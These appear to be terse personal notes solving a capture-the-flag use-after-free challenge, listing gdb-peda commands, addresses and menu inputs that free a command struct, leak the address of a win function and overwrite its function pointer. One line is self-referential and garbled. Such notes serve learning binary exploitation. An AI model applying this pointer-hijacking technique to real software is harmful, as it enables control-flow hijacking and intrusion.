    get the address of m()
        0x080489f6
    make a username aaaaaaaaaaaaaaaa with m option
    look for the cmd struct with gdb that have m() pointer and a pointer refering to username
        gdb-peda ./vuln
        b *0x08048d91
        r
        m
        x/2wx 0x804c1a0
        x/2wx 0x0804c5c0
        cmd struct is stored as {function_addr} {username_addr}
free the cmd struct
    use the i option
        i
        y
        c
leak the hahaexploitgobrrr address
    use the s option
        c
        s
        c
        0x80487d6 is address for 0x80487d6
make cmd struct
    use the l option 
    input the exact format for cmd struct but change the pointer refering to m() to pointer refering to hahaexploitgobrrr 
        l
